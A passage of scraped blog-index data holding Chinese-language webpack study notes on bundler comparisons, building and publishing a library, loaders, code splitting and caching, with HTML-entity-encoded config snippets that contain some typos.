js、css、图片等资源文件都支持打包\n开箱即用：HRM、Tree-shaking等功能\n代码分割：可以将代码切割成不同的 chunk，实现按需加载，降低了初始化时间\n插件系统，具有强大的 Plugin 接口，具有更好的灵活性和扩展性\n易于调试：支持 SourceUrls 和 SourceMaps\n快速运行：webpack 使用异步 IO 并具有多级缓存，这使得 webpack 很快且在增量编译上更加快\n生态环境好：社区更丰富，出现的问题更容易解决\n\n\n除了Webpack外，你还了解哪些模块管理工具 webpack: 就目前而言，webpack已是最常用的打包工具，webpack是基于入口的。webpack会自动地递归解析入口所需要加载的所有资源文件，然后用不同的Loader来处理不同的文件，用Plugin来扩展webpack功能。 gulp： gulp是一个前端自动化构建工具，强调的是前端开发的工作流程，可以通过配置一系列的task，第一task处理的事情（如代码压缩，合并，编译以及浏览器实时更新等）。然后定义这些执行顺序，来让glup执行这些task，从而构建项目的整个开发流程。自动化构建工具并不能把所有的模块打包到一起，也不能构建不同模块之间的依赖关系。\n\n  grunt：  是基于任务和流（Task、Stream）的。类似jQuery，找到一个（或一类）文件，对其做一系列链式操作，更新流上的数据， 整条链式操作构成了一个任务，多个任务就构成了整个web的构建流程。  Rollup\n\nRollup 是一款 ES Modules 打包器， 从作用上来看，Rollup 与 Webpack 非常类似。不过相比于 Webpack，Rollup要小巧的多 现在很多我们熟知的库都都使用它进行打包，比如：Vue、React和three.js等 Parcel Parcel ，是一款完全零配置的前端打包器，它提供了 “傻瓜式” 的使用体验，只需了解简单的命令，就能构建前端应用程序 Parcel 跟 Webpack 一样都支持以任意类型文件作为打包入口，但建议使用\t\tHTML文件作为入口，该HTML文件像平时一样正常编写代码、引用资源。 模块化是一种处理复杂系统分解为更好的可管理模块的方式。可以用来分割、组织和打包应用。每个模块完成一个特定的子功能，所有的模块按某种方法组装起来，成为一个整体。 在前端领域中，除了Webpack外，比较流行的模块打包工具还包括Rollup、Parcel、snowpack和最近风靡的Vite。\n\n  2.1. Rollup  Rollup 是一款 ES Modules 打包器，可以将小块代码编译成大块复杂的代码，例如 library 或应用程序。从作用上来看，Rollup 与 Webpack 非常类似。不过相比于 Webpack，Rollup 要小巧的多。现在很多苦都使用它进行打包，比如：Vue、React和three.js等。  使用之前，可以使用npm install –global rollup 命令进行安装。Rollup 可以通过命令行接口(command line interface)配合可选配置文件(optional configuration file)来调用，或者可以通过 JavaScript API来调用。运行 rollup –help 可以查看可用的选项和参数。  2.2. Parcel  Parcel ，是一款完全零配置的前端打包器，它提供了 “傻瓜式” 的使用体验，只需了解简单的命令，就能构建前端应用程序。  2.3.  Vite  Vite是Vue的作者尤雨溪开发的Web开发构建工具，它是一个基于浏览器原生ES模块导入的开发服务器，在开发环境下，利用浏览器去解析import，在服务器端按需编译返回，完全跳过了打包这个概念，服务器随启随用。同时不仅对Vue文件提供了支持，还支持热更新，而且热更新的速度不会随着模块增多而变慢。  Vite具有以下特点： - 快速的冷启动 - 即时热模块更新（HMR，Hot Module Replacement） - 真正按需编译  Vite由两部分组成： - 一个开发服务器，它基于 原生 ES 模块 提供了丰富的内建功能，如速度快到惊人的 [模块热更新HMR。 - 一套构建指令，它使用 Rollup打包你的代码，并且它是预配置的，可以输出用于生产环境的优化过的静态资源。  Vite在开发阶段可以直接启动开发服务器，不需要进行打包操作，也就意味着不需要分析模块的依赖、不需要编译，因此启动速度非常快。当浏览器请求某个模块的时候，根据需要对模块的内容进行编译，大大缩短了编译时间。工作原理如下图所示。  在热模块HMR方面，当修改一个模块的时候，仅需让浏览器重新请求该模块即可，无须像Webpack那样需要把该模块的相关依赖模块全部编译一次，因此效率也更高。3. webpack，rollup，parcel优劣？(了解)    对比\n  Webpack  Rollup  Parcel  功能\n为处理资源管理和分割代码而生，可以用来处理任何类型的文件，灵活，插件多。    用标准化的格式（es6）来写代码，通过减少死代码尽可能地缩小包体积。    用标准化的格式（es6）来写代码，通过减少死代码尽可能地缩小包体积。配置    webpack需要配config文件，指明entry, output, plugin，transformations。    rollup需要配config文件，指明entry, output, plugin，transformations。rollup 有对import&#x2F;export所做的node polyfills，webpack没有。rollup支持相对路径，而webpack没有，所以得使用\nparcel则是完全开箱可用的，不用配置。\n\n入口文件    webpack只支持js文件作为入口文件，如果要以其他格式的文件作为入口，比如html文件为入口，如要加第三方Plugin。    rollup可以用html作为入口文件，但也需要plugin，比如rollup-plugin-html-entry。    parcel可以用index.html作为入口文件，而且它会通过看index.html的script tag里包含的什么自己找到要打包生成哪些js文件。transformations    transformations指的是把其他文件转化成js文件的过程，需要经过transformation才能够被打包。webpack使用Loaders来处理。    rollup使用plugins来处理。    parcel会自动去转换，当找到配置文件比如.babelrc, .postcssrc后就会自动转。摇树优化    摇树优化是webpack的一大特性。需要1，用import&#x2F;export语法，2，在package.json中加副作用的入口，3，加上支持去除死代码的缩小器（uglifyjsplugin）。    rollup会统计引入的代码并排除掉那些没有被用到的。这使您可以在现有工具和模块的基础上构建，而无需添加额外的依赖项或膨胀项目的大小。    parcel不支持摇树优化。dev server    webpack用webpack-dev-server。rollup用rollup-plugin-serve和rollup-plugin-livereload共同作用。    parcel内置的有dev server热更新    webpack的 wepack-dev-server支持hot模式。    rollup不支持hmr。    parcel有内置的hmr。代码分割    webpack通过在entry中手动设置，使用CommonsChunkPlugin，和模块内的内联函数动态引入来做代码分割。    rollup有实验性的代码分割特性。它是用es模块在浏览器中的模块加载机制本身来分割代码的。需要把experimentalCodeSplitting 和 experimentalDynamicImport 设为true。    parcel支持0配置的代码分割。主要是通过动态improt。\n","categories":["前端工程化"],"tags":["webpack"]},{"title":"webpack创建library","url":"/2020/10/31/webpack/webpack%E5%88%9B%E5%BB%BAlibrary/","content":"除了打包应用程序，webpack 还可以用于打包 JavaScript library。例如：当我们想要自己开发一个组件库工具或者框架的时候也就是说我们自己造一个轮子给别人用的时候我们免不了要开发很多的模块，最终都可以请webpack来帮我们打包。\n创建一个 library假设我们正在编写一个名为 webpack-numbers 的小的 library，可以将数字 1 到 5转换为文本表示，反之亦然，例如将 2 转换为 ‘two’。使用 npm 初始化项目，然后安装 webpack ， webpack-cli 和 lodash ：\nnpm i webpack webpack-cli lodash -D\n我们将 lodash 安装为 devDependencies 而不是 dependencies ，因为我们不需要将其打包到我们的库中，否则我们的库体积很容易变大。\nsrc&#x2F;ref.json\n[&#123;  &quot;num&quot;: 1,  &quot;word&quot;: &quot;One&quot;&#125;,&#123;  &quot;num&quot;: 2,  &quot;word&quot;: &quot;Two&quot;&#125;,&#123;  &quot;num&quot;: 3,  &quot;word&quot;: &quot;Three&quot;&#125;,&#123;  &quot;num&quot;: 4,  &quot;word&quot;: &quot;Four&quot;&#125;,&#123;  &quot;num&quot;: 5,  &quot;word&quot;: &quot;Five&quot;&#125;,&#123;  &quot;num&quot;: 0,  &quot;word&quot;: &quot;Zero&quot;&#125;]\nsrc&#x2F;index.js\nimport _ from &#x27;lodash&#x27;;import numRef from &#x27;./ref.json&#x27;;export function numToWord(num) &#123; return _.reduce(  numRef, (accum, ref) =&gt; &#123;   return ref.num === num ? ref.word : accum; &#125;,  &#x27;&#x27;);&#125;export function wordToNum(word) &#123; return _.reduce(  numRef, (accum, ref) =&gt; &#123;   return ref.word === word &amp;&amp; word.toLowerCase() ? ref.num :accum; &#125;,  -1);&#125;\n\nconst path = require(&#x27;path&#x27;);module.exports = &#123; mode:&#x27;production&#x27;, entry: &#x27;./src/index.js&#x27;, output: &#123;  path: path.resolve(__dirname, &#x27;dist&#x27;),  filename: &#x27;webpack-numbers.js&#x27;,  library:&#123;    name:&#x27;webpackNumbers&#x27;,\ttype&#x27;umd&#x27;  &#125;,  globalObject:&#x27;globalThis&#x27;&#125;, externals:&#123; \tlodash:&#123;   lodash  引入包的名字\t\tcommonjs:&#x27;lodash&#x27;,   //  兼容引入形式\t\tcommonjs2:&#x27;lodash&#x27;,\t\tamd:&#x27;lodash&#x27;,\t\troot:&#x27;_&#x27;\t&#125; &#125;&#125;;\n\n发布到线上拥有npm账号npm config get registry   &#x2F;&#x2F; 一定要保证本地的registry的地址是https://registry.npmjs.org/    因为这样的话才是真正的连接到npm官网的地址上   有些人可能是淘宝  那么就访问不上去了npm adduser  &#x2F;&#x2F;添加用户   输入用户名密码包的名字必须是全球唯一的。   npm publish    上传时package.json中的main入口必须对应：dist&#x2F;文件名   因为别人通过 require去载入包的时候  会读取 这个main这是的暴露的包的名字npm install 包名就可以下载了\nWebpack 配置\nwebpack.config.js\noutput:&#123;\tpath:&#x27;&#x27;,\tfilname:&#x27;&#x27;,\tlibrary:&#x27;&#x27;,    //我们只是定义了导出 并且没有使用它  所以webpack认为这个代码是没有用的。   如何让他作为一个library来进行一个对外的打包   让代码不被 Webpack Tree shaking   配置 library:&#x27;包的名字&#x27;&#125;\n\n到目前为止，一切都应该与打包应用程序一样，这里是不同的部分 - 我们需要通过output.library 配置项暴露从入口导出的内容。我们暴露了 webpackNumbers ，以便用户可以通过 script 标签使用。\t\n&lt;script src=&quot;https://example.org/webpack-numbers.js&quot;&gt;&lt;/script&gt;&lt;script&gt; window.webpackNumbers.wordToNum(&#x27;Five&#x27;);&lt;/script&gt;\n\n然而它只能通过被 script 标签引用而发挥作用，它不能运行在 CommonJS、AMD、Node.js 等环境中。作为一个库作者，我们希望它能够兼容不同的环境，也就是说，用户应该能够通过以下方式使用打包后的库：CommonJS module require:\nconst webpackNumbers = require(&#x27;webpack-numbers&#x27;);// ...webpackNumbers.wordToNum(&#x27;Two&#x27;);\nAMD module require:\nrequire([&#x27;webpackNumbers&#x27;], function (webpackNumbers) &#123; // ... webpackNumbers.wordToNum(&#x27;Two&#x27;);&#125;);\nscript tag:\n&lt;!DOCTYPE html&gt;&lt;html&gt;... &lt;script src=&quot;https://example.org/webpack-numbers.js&quot;&gt;&lt;/script&gt; &lt;script&gt;  // ...  // Global variable  webpackNumbers.wordToNum(&#x27;Five&#x27;);  // Property in the window object  window.webpackNumbers.wordToNum(&#x27;Five&#x27;);  // ... &lt;/script&gt;&lt;/html&gt;\n\n我们更新 output.library 配置项，将其 type 设置为 ‘umd’ ：\nconst path = require(&#x27;path&#x27;);module.exports = &#123; entry: &#x27;./src/index.js&#x27;, output: &#123;  path: path.resolve(__dirname, &#x27;dist&#x27;),  filename: &#x27;webpack-numbers.js&#x27;,  library: &#123;   name: &#x27;webpackNumbers&#x27;,   type: &#x27;umd&#x27;,   //  window&#x27;(es module)   &#x27;commonjs&#x27;   &#x27;module&#x27; 它在experiments:&#123;outputModule:true&#125;才能使用，他是一个实验性的功能，就不需要这个name了。&lt;script type=&quot;module&quot;&gt;    &#x27;umd&#x27;支持所有的类型。  esmodule 有问题  &#125;,  globalObject:&#x27;globalThis&#x27;    //需要全局的this来去  代替self   否则浏览器会self  undefined报错 &#125;,&#125;;\n现在 webpack 将打包一个库，其可以与 CommonJS、AMD 以及 script 标签使用\n","categories":["前端工程化"],"tags":["webpack"]},{"title":"webpack基础","url":"/2020/11/24/webpack/webpack%E5%9F%BA%E7%A1%80/","content":"一.基础感念webpack是运行在nodejs中的webpack 的 why 与how\n为什么学   （原先script要按顺序）构建打包？习惯使用开箱即用的脚手架来完成项目配置，对开发环境和生产环境的搭建了解知之甚少，前端架构最重要的点在于 前端工程化（webpack就是我们搭建前端环境的技术选型，也是最主流的）\n为什么需要使用webpack问题：作用域，文件大（网络瓶颈，短暂白屏），可读性差，可维护性弱\n解决：1.作用域：使用grunt和gulp管理项目资源，称之为任务执行器，将所有的项目文件拼接在一起，（利用js的立即调用表达式IIFE）    当函数变成一个立即调用表达式时，表达式的变量是不能在外部访问的，不会污染我们的window环境，解决了作用域问题。    可以通过赋值变量 函数中通过return暴露出来变量获取数据\n问题使用十行代码可能就要加载万行代码（通过代码拆分解决,模块化，commonjs,amd,cmd,es6）\n\nnode环境语法在浏览器无法加载它不支持commonjs  以及一些其他的语法早期解决方案（页面导入require  define,script标签data-main）现在ECMAscript  通过es6拥有自己的模块化  export default  import from (script 标签指定type&#x3D;”module”)通过http-server搭建一个http请求\nes6可能还不太兼容所以使用webpack帮我们打包（vs竞品 parcel称零配置用户一般无需做其他的配置开即聚用 rollup.js用标准化的格式来编写代码es6通过减少无用的代码来尽可能的缩小包的体积，一般只用来打包js  黑马vite vue3使用  有petite vue框架 从开发 编译 发布 demo 几乎全部都是Vite完成的 基于esmodule的构建方式 按需编译 热模块更新  丝滑体验 与vue3原理结合）不会谁取代谁  各有各的应用场景\n二.基础应用安装使用（要注意webpack与nodejs版本兼容问题）1.要有nodejs 运行环境2.全局与工作目录下安装    npm install webpack webpack-cli –global  全局 在任何目录都可以运行webpack(不推荐全局使用)    本地安装需要先有npm的包管理的配置文件npm init -y  npm install webpack webpack-cli –save-dev运行1.直接使用 webpack  默认打包  （入口：.&#x2F;src&#x2F;index 出口：dist&#x2F;main.js）2.webpack –stats detailed 可以看到详细的打包信息npx 执行没有找到命令会到上层目录查找\n自定义webpack配置webpack –help查看 配置npx 工具概念：命令配置：npx webpack –entry .&#x2F;src&#x2F;index.js –mode production\n配置文件配置(webpack.config.js文件名不允许随意起，他是webpack自动读取的)path需是绝对路径\n三.自动引入资源（插件）（html中引入资源）什么是插件：webpack就像是一条生产线，需要经过一系列的流程后才能将源文件（入口文件，可以相互依赖（js,css-loaders加载器））经过编译（工具插件plugins 帮助webpack来执行一些特定的任务（打包优化，资源管理））转化成输出的结果\n插件：三组（community社区插件   webpack内置官方插件   webpack contrib 第三方插件）\n如何使用htmlWebpackPlugin?npm install html-webpack-plugin -D\nconst HtmlWebpackPlugin = require(&#x27;html-webpack-plugin)module.exports=&#123;\tplugins:[\t\tnew HtmlWebpackPlugin(&#123;\t\t\ttemplate:&#x27;./index.html&#x27;,\t\t\tfilename:&#x27;app.html&#x27;,\t\t\tinject:&#x27;body&#x27;\t\t&#125;)\t]&#125;\n\n清理上次dist里的垃圾\noutput:&#123;\tfilename:    ,\tpath:    ,\tclean:true&#125;\n四.搭建开发环境解决手工工作：复制index.html路径到地址栏才能访问页面，每次更新代码都需要刷新页面。通过搭建开发环境来解决，提高开发体验\nmode:’development’  开发模式   通过代码对环境进行调试（core.js模块）\n&quot;scripts&quot;: &#123;  &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot;,  &quot;build&quot;: &quot;cross-env NODE_ENV=production webpack --config webpack.config.js&quot;,  &quot;dev&quot;: &quot;cross-env NODE_ENV=development webpack-dev-server --config webpack.config.js&quot;,  &quot;start&quot;: &quot;cross-env NODE_ENV=development webpack serve&quot;&#125;,const isDev = process.env.NODE_ENV === &quot;development&quot;;\n\n精准锁定代码出错的位置\ndevtool:&#x27;inline-source-map&#x27;,\n使用watch mode(观察模式)每次编译都要手动运行npx webpacknpx webpack –watch   实时监测编译变化 （需要重新刷新页面）\nwebpack-dev-server为我们提供了一个最基本的web server，并具有live reloading（实时重新加载）功能。当页面修改了编译后浏览器会监听到文件的修改实现自动刷新npm install webpack-dev-server -D\nplugins:&#123;\tdevServer:&#123;\t\tstatic: &#x27;./dist&#x27; #server的根目录\t&#125;&#125;\nnpx debpack-dev-server –open(自动打开一个页面)  启动项目   实际是吧数据的打包以后的bundle文件放到了内存里。提高开发效率和webpack的编译效率\n五.资源模块加载内置资源模块asset modules来引入任何的其他类型资源   是一种模块类型  它允许我们用webpack来打包其他的资源文件 如：字体，图标等资源模块类型：asset module type   会通过四种新的类型模块来替换所有的loader1.asset&#x2F;resource他会发送一个单独的文件并导出URL  2.asset&#x2F;inline 它会导出一个资源的Data URL3.asset&#x2F;source 会导出资源的源代码4.asset 通用资源类型 会在导出一个Data URL 和发送一个单独的文件之间自动进行选择\nmodule配置模块\noutput:&#123;\tassetModuleFilename:&#x27;images/[contenthash].[ext]&#x27; //自动生成一个文件名//根据文件的内容来生成一个哈希的字符串&#125;,module:&#123;\trules:&#123; //规则\t\t&#123;  //配置对象来去加载不同类型的文件\t\t\ttest: &#x27;/\\.png$/&#x27;, //test 更正则表达式 来加载定义文件的类型\t\t \ttype:&#x27;asset/resource&#x27;,// 图片为URL格式\t\t\tgenerator:&#123; // 优先级高于在output 配置的优先级\t\t\t\tfilename:&#x27;images/[contenthash].[ext]&#x27;\t\t\t&#125;\t\t&#125;,\t\t&#123;\t\t\ttest: &#x27;/\\.svg$/&#x27;,\t\t\ttype: &#x27;asset/inline&#x27; //图片为base64格式\t\t&#125;,\t\t&#123;\t\t\ttest: &#x27;/\\.txt$/&#x27;,\t\t\ttype: &#x27;asset/source&#x27; // 加载文件的源内容\t\t&#125;,\t\t&#123;\t\t\ttest: &#x27;/\\.jpg$/&#x27;,\t\t\ttype: &#x27;asset&#x27;, //会在导出一个Data URL 和发送一个单独的文件之间自动进行选择   小于8k生成base64  大于8k创建资源\t\t\tparser:&#123;\t\t\t\tdataUrlCondition:&#123;\t\t\t\t\tmaxSize:4 * 1024 * 1024  // 当突变大于4兆在生成一个资源文件  否则的话就是base64\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;\t&#125;&#125;\n\n六.loader上面采用四种资源模块来引入外部资源webpack还可以通过loader引入其他类型的文件webpack智能理解js和json这样的文件loader可以让webpack去解析其他的类型的文件  并且将这些文件转化为有效的模块  以供我们应用程序的使用  例如加载css\n如何使用\nmodule:&#123;\trules:&#123;\t\t&#123; //当碰到通过require或import去解析 .txt文件时在对文件进行打包之前先使用raw-loader进行转化\t\t\ttest: &#x27;/\\.txt$/&#x27;, // 定义那种类型的文件被转换\t\t \tuse:&#x27;raw-loader&#x27;,  // 在定义转化的时候应该使用哪个loader来进行转换\t\t&#125;\t&#125;&#125;\n\n如何配置\nmodule:&#123;\trules:&#123;\t\t&#123;\t\t\ttest: &#x27;/\\.css$/&#x27;,\t\t \tuse:[&#x27;style-loader&#x27;,&#x27;css-loader&#x27;],  // 自下而上 loader链式调用  先需要用css-loader让我们打包没有问题识别我们css文件   在通过style-loader把css放置到我们的页面上\t\t&#125;，\t\t&#123;\t\t\ttest: &#x27;/\\.(css|less)/$&#x27;,\t\t \tuse:[&#x27;style-loader&#x27;,&#x27;css-loader&#x27;,&#x27;less-loader&#x27;],\t\t&#125;，\t&#125;&#125;\n抽离和压缩css抽离：npm install mini-css-extract-plugin -D   这个插件时基于webpack5构建的压缩：npm install css-minimizer-webpack-plugin -D  这个属于优化插件在optimization选项配置\nconst MiniCssExtractPlugin = require(&#x27;mini-css-extract-plugin&#x27;)const CssMinimizerWebpackPlugin = require(&#x27;css-minimizer-webpack-plugin&#x27;)mode:&#x27;production&#x27;,   //使用压缩环境必须时这个plugins:&#123;\tnew MiniCssExtractPlugin(&#123;\t\tfilename:&#x27;style/[contenthash].css&#x27;\t&#125;)&#125;module:&#123;\trules:&#123;\t\t&#123;\t\t\ttest: &#x27;/\\.(css|less)/$&#x27;,\t\t \tuse:[MiniCssExtractPlugin.loader,&#x27;css-loader&#x27;,&#x27;less-loader&#x27;],  //之前通过style-loader 将样式放到页面的style 更改为通过link引入的css文件\t\t&#125;\t&#125;&#125;optimization:&#123;\tminimizer:[\t\tnew CssMinimizerWebpackPlugin()\t]&#125;\n\n加载image图像如何在css里加载图片资源mode:’development’   清除提示\n加载fonts字体css3中新增webfont功能可以在css3中去加载一个font字库  然后在代码中就可以定义自己的icon图标了如何去加载字体这样的资源（asset module资源模块）\n&#123;\ttest:&#x27;/\\.(woff|woff2|eot|ttf|otf)$/&#x27;,  //字体文件会有很多种类型\ttype:&#x27;asset/resource&#x27;  //载入任何类型的资源&#125;\n\n之后向文本一样去加载一个文本代码  &amp;#xe668;(操作dom时必须是innerhtml不能使innertext)\n加载数据之前图片  cion图标  文本文件等等都数据还有类似于json，csv，tsv，xml等，json和nodejs类似webpack可以直接支持但是像csv，tsv和xml我都没需要使用loader才能处理他们npm install csv-loader xml-loader -D\n&#123;\ttext:&#x27;/\\.(tsv|csv)$/&#x27;, //会转换成 数组 \tuse:&#x27;csv-loader&#x27;&#125;&#123;\ttext:&#x27;/\\.xml$/&#x27;,  //会转换成 js对象\tuse:&#x27;xml-loader&#x27;&#125;\n\n自定义JSON模块parser通过使用自定义parser替代指定的webpack loader，可以将任何toml，yaml，或json5文件作为JSON模块导入。npm install toml yaml json5 -D\nconst toml = require(&#x27;toml&#x27;)const yaml = require(&#x27;yaml&#x27;)const json5 = require(&#x27;json5&#x27;)&#123;\ttext:&#x27;/\\.toml$/&#x27;,  //会转换成 js对象\ttype:&#x27;json&#x27;,\tparser:&#123;\t\tparse:toml.parse\t&#125;&#125;&#123;\ttext:&#x27;/\\.yaml$/&#x27;,  //会转换成 js对象\ttype:&#x27;json&#x27;,\tparser:&#123;\t\tparse:yaml.parse\t&#125;&#125;&#123;\ttext:&#x27;/\\.json5$/&#x27;,  //会转换成 js对象\ttype:&#x27;json&#x27;,\tparser:&#123;\t\tparse:json5.parse\t&#125;&#125;\n\n七.如何使用babel-loaderwebpack默认转换  是源代码原封不动进行转换的  那么如果浏览器不兼容呢？使用babel-loader将es6 转换成低版本浏览器能够识别的js代码npm install babel-loader @babal&#x2F;core @babel&#x2F;preset-env -Dbabel-loader: 解析es6的桥梁@babal&#x2F;core babel： 核心模块@babel&#x2F;preset-env： babel预设，一组Babel插件的集合\n&#123;\ttest:&#x27;/\\.js$/&#x27;,\texclude:&#x27;/node_modules/&#x27;,//业务里既可以加载本地js也可以加载全局里的node modules里面的js  对于全局的node modules里的js我们是不需要进行babel-loader的编译的  所以需要排除 node modules 里的代码\tuse:&#123;\t\tloader:&#x27;babel-loader&#x27;,\t\t\toptions:&#123;\t\t\t\tpresets:[&#x27;@babel/preset-env&#x27;],\t\t\t\tplugins:[\t\t\t\t\t[&#x27;@babel/plugin-transform-runtime&#x27;]\t\t\t\t]\t\t\t&#125;\t&#125;&#125;\n\nregeneratorRuntime是webpack打包生成的全局辅助函数，有babel生成，用于兼容async&#x2F;await的语法npm install @babel&#x2F;runtime -D插件： npm install @babel&#x2F;plugin-transform-runtime -D@babel&#x2F;runtime： 包含了regeneratorRuntime运行时需要的内容@babel&#x2F;plugin-transform-runtime： 会在需要regeneratorRuntime的地方自动require打包然后编译的时候就会需要它\nplugins:[\t\t\t\t\t[&#x27;@babel/plugin-transform-runtime&#x27;]\t\t\t\t]\n\n八.代码分离能够把代码分离到不同的bundle中bundle就是我们打包分离出来的文件然后我们把这些文件按需加载或者是并行加载代码分离可以用于获取更小的bundle以及控制资源加载的优先级，如果使用合理会极大的影响加载事件常用的代码分离：1.配置入口节点，使用entry来手动配置分离代码（如果是多个入口那么这些多个入口共享的文件会分别在每个包里面去重复打包）2.防止重的分离方法：在entry（入口）的地方通过entry dependencies或者 SplitChunksPlagin去重和分离代码3.动态导入 通过模块的内联函数import来调用这个函数分离代码\n第一种\nentry:&#123;\tindex:&#x27;./src/index&#x27;,\tanother:&#x27;./src/another-module.js&#x27;&#125;output:&#123;\tfilename:&#x27;[name]&#x27;.bundle.js,   //方式多个入口打包出口文件冲突，使用[&#x27;name&#x27;]可以拿到我们入口里面的key的名字&#125;import _ from &#x27;lodash&#x27;console.log（_.join([&#x27;Vue&#x27;,&#x27;React!&#x27;],&#x27;-&#x27;)）\n第二种 防止重复\n// 1.entry dependenciesentry:&#123;\tindex:&#123;\t\timport :&#x27;./src/index&#x27;,\t\tdependOn:&#x27;shared&#x27;,  //可以把一些共享的文件给定义出来\t&#125;,\tanother:&#123;\t\timport :&#x27;./src/another-module.js&#x27;,\t\tdependOn:&#x27;shared&#x27;,  //可以把一些共享的文件给定义出来\t&#125;\tshared:&#x27;lodash&#x27; //当我们这两个模块里边 有lodash这个模块的时候  他就会把他抽离出来  并且把他取名为叫shared这样的一个chunk。&#125;//2.SplitChunksPlagin插件entry:&#123;\tindex:&#x27;./src/index&#x27;,\tanother:&#x27;./src/another-module.js&#x27;&#125;optimization:&#123;\tsplitChunks:&#123;\t\tchunks:&#x27;all&#x27;  //实现代码分割并把公共的代码 抽离到一个单独的文件里\t&#125;&#125;\n\n第三种使用  ECMAScript提案的import()函数\nfunction getComponent()&#123;\treturn import(&#x27;lodash&#x27;)   // 返回的是一个Promise对象\t.then((&#123;default:_&#125;)=&gt;&#123;    // .then的回调函数拿到的是 载入的lodash的一个引用\t\tconst element = document.createElement(&#x27;div&#x27;)\t\telement.innerHTML = _.join([&#x27;Vue&#x27;,&#x27;React!&#x27;],&#x27;-&#x27;)\t\treturn element\t&#125;)&#125; // 这样写的目的是为了让 import 来去帮助我们去抽离一个单独的lodash文件getComponent().then((element)=&gt;&#123;\tdocument.body.appendChild(element)&#125;)// 静态导入的内容和动态导入的内容一起来 去做代码抽离optimization:&#123;\tsplitChunks:&#123;\t\tchunks:&#x27;all&#x27;  //实现代码分割并把公共的代码 抽离到一个单独的文件里\t&#125;&#125;\n为什么使用动态导入，静态导入不就行了吗？动态导入的应用1.可以实现懒加载： 按需加载，是一种很好的优化页面或应用的方式。这种方式实际上是先把你的代码在一些逻辑断点处分离开，然后在一些代码块中完成某些操作后，立即引用或即将引用另外一些新的代码块。这样加快了应用的初始加载速度，减轻了它的总体体积，因为某些代码块可能永远不会加载。\n//懒加载import(/* webpackChunkName: &#x27;打包后的文件名&#x27;*/&#x27;文件地址&#x27;).then(回调)//通过注释 控制懒加载打包后的文件名  +bundle.js\n\n2.可以实现预获取&#x2F;预加载模块webpack v4.6.0+ 增加了对预获取和预加载的支持。在声明import时，使用下面这些内置指令，可以让webpack输出”resource hint(资源提示)”,来告诉浏览器：prefetch(预获取)：将来某些导航下可能需要的资源preload(预加载)：当前导航下可能需要资源\n// 预获取   意义首页面的内容都加载完毕在网络空闲的时候再去加载我们打包好的 文件     比懒加载还要优秀import(/* webpackChunkName: &#x27;打包后的文件名&#x27;, webpackPrefetch:true*/&#x27;文件地址&#x27;)// 预加载   和懒加载类似   实现页面模块的并行加载import(/* webpackChunkName: &#x27;打包后的文件名&#x27;, webpackPreload:true*/&#x27;文件地址&#x27;)\n\n九.缓存以前我们使用webpack来打包我们模块化以后的应用程序，webpack会生成一个可以部署的dist目录。然后我们把打包好的内容放置到这个目录里将来我们把这个目录的内容部署到server上也就是服务器上，浏览器就可以访问我们这个服务器上的网站和资源了，而最后一步获取资源是比较耗时间的，这就是为什么浏览器会使用缓存的技术，可以通过命中缓存以降低网络流量，使网站加载速度更快，然而我们在部署新版本的时候不更改资源的文件名，浏览器可能会认为你没有更新，那就会使用它的缓存版本，由于缓存的存在，我们需要获取新的代码的时候，就会显的很棘手，现在我们通过webpack配置来确保编译生成的文件能够被客户端缓存而在文件优化的时候又能够请求新的文件。问题：在dist文件里看到打包好以后的文件，浏览器有缓存特性会把文件缓存下来，但是如果我们修改了这个文件里的内容，而文件名没有变，浏览器会认为我们没有修改这个文件，所以我们必须在打包的时候把这个文件的名字也一同给重新打包\noutput:&#123;\tfilename:&#x27;[name].[contenthash].js&#x27;  //文件名 会跟随这我们文件内容的变化而变化，这样的话就不怕浏览器缓存了。&#125;\n缓存第三方库代码，如：lodash需不需要缓存缓存自己的业务逻辑代码，第三方的代码比如lodash需不需要缓存。如果我们把lodash单独提取到一个vendor chunk里边，是比较推荐的方法，这是因为他们很少像本地源代码那样频繁修改。因此通过以上的步骤，我们利用client或浏览器的长效缓存的机制，命中的缓存来消除请求。从而减少向server获取资源的次数同时还能保证client代码和server代码版本的一致。把第三方库的代码像lodash单独打包缓存到浏览器里，这样只有我们自己代码发生变化的时候我们可以去更新但是第三方的代码始终可以是浏览器缓存的内容，那就需要对第三方的代码做一个缓存。对文件进行单独打包并缓存到浏览器里，代码（文件内容以及文件名都是不变的）\noptimization:&#123;\tsplitChunks：&#123;\t\tcacheGroups:&#123;    //定义缓存组    缓存第三方文件（node_modules里的）\t\t\tvendor:&#123;\t\t\t\ttest: /[\\\\/]node_modules[\\\\/]/  //通过文件目录的文件名去识别   这个目录的前面后面可能会有斜线\t\t\t\tname:&#x27;vendors&#x27;,\t\t\t\tchunks:&#x27;all&#x27;         // 定义那些chunk做处理\t\t\t&#125;\t\t&#125;\t&#125;&#125;\n\n将所有的js文件，放到一个文件夹中\noutput:&#123;\tfilename:&#x27;scripts/[name].[contenthash].js&#x27;&#125;\n小结：缓存业务代码：当我们的项目部署到服务器上的时候，浏览器加载完我们服务器上的文件会缓存我们打包好的模块。这样如果我们修改了js代码，文件名如果没变，浏览器会使用用户本地缓存的内容，就获取不到新的内容了。因此我们通过修改输出文件的文件名来解决   使用可替换模板字符串方法来定义contenthash   实现只要文件的内容不变哈希的字符串也不变缓存第三方代码：这些文件不频繁更新  可以提高我们首屏的打开速度 节省我们网络流量\n十.拆分开发环境和生产环境的配置  让打包变得更灵活平常我们都是手动的调整mode选项  实现生产环境和开发环境的切换很多配置在生产环境和开发环境存在不一致的情况如：开发环境没有必要设置缓存，生产环境还需要设置公共路径等\n公共路径publicPash 配置选项在各种场景中都非常有用，可以通过它来指定应用程序中所有资源的基础路径\n现在所有的资源都是通过相对路径来去引用的。我们可不可以根据cdn的路径或者当前服务器的某个路径 来去修改我们link上面的这个路径的前缀。\noutput:&#123;\tpublicPash: &#x27;http://localhost:8080/&#x27;    // 指定一个域名    这个域名可以指定为项目的前端域名，或者cdn服务器的域名&#125;\n\n环境变量可以帮助我们清除webpack.config.js这个配置文件里边的开发环境和生产环境之间的差异在命令行 npx webpack –env production (–env goal&#x3D;local)    知道用户在开发环境使用还是生产环境使用  配置对应的mode选项将导出的对象变为函数，函数拿到env   生产环境代码压缩  开发环境代码不压缩\nmode:env.production?&#x27;production&#x27;:&#x27;development&#x27;\nwebpack开箱即用的terser插件进行压缩js代码  当我们配置minimizer压缩css代码时  terser功能失效npm install terser-webpack-plugin -D\nconst TerserPlugin = require(&#x27;terser-webpack-plugin&#x27;)optimization:&#123;\tminimizer:&#123;\t\t//此处时压缩css的插件\t\tnew 